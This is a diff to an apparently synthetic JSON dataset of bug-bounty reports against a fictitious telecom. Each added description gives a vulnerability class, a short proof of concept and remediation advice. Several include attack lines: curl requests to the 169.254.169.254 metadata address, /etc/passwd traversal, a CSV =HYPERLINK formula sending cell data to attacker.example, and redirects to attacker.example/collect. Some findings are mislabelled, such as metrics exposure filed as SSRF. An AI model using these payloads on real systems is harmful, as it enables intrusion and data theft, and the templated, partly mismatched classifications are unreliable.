+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.bergtal-telecom.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6520,7 +6569,8 @@
           "offset": "8d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.bergtal-telecom.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6683,7 +6733,8 @@
           "offset": "5d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.bergtal-telecom.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6842,7 +6893,8 @@
           "offset": "4d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.bergtal-telecom.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7010,7 +7062,8 @@
           "offset": "7d 9h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7170,7 +7223,8 @@
           "offset": "11d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.bergtal-telecom.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7321,7 +7375,8 @@
           "offset": "5d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7445,7 +7500,8 @@
           "offset": "16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7514,7 +7570,8 @@
           "offset": "1d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.bergtal-telecom.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7674,7 +7731,8 @@
           "offset": "6d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7842,7 +7900,8 @@
           "offset": "7d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.bergtal-telecom.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7998,7 +8057,8 @@
           "offset": "2d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8178,7 +8238,8 @@
           "offset": "5d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.bergtal-telecom.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8279,7 +8340,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8410,7 +8472,8 @@
           "offset": "4d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8505,7 +8568,8 @@
           "offset": "2d 4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.bergtal-telecom.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8657,7 +8721,8 @@
           "offset": "8d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8768,7 +8833,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.bergtal-telecom.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8909,7 +8975,8 @@
           "offset": "5d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9065,7 +9132,8 @@
           "offset": "7d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.bergtal-telecom.foo/export`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9193,7 +9261,8 @@
           "offset": "7d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9328,7 +9397,8 @@
           "offset": "6d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9472,7 +9542,8 @@
           "offset": "7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9588,7 +9659,8 @@
           "offset": "1d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.bergtal-telecom.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9697,7 +9769,8 @@
           "offset": "4d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9818,7 +9891,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.bergtal-telecom.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9942,7 +10016,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.bergtal-telecom.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10105,7 +10180,8 @@
           "offset": "5d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.bergtal-telecom.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10256,7 +10332,8 @@
           "offset": "7d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.bergtal-telecom.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10347,7 +10424,8 @@
           "offset": "3d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.bergtal-telecom.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10485,7 +10563,8 @@
           "offset": "7d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.bergtal-telecom.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10599,7 +10678,8 @@
           "offset": "2d 22h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.bergtal-telecom.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
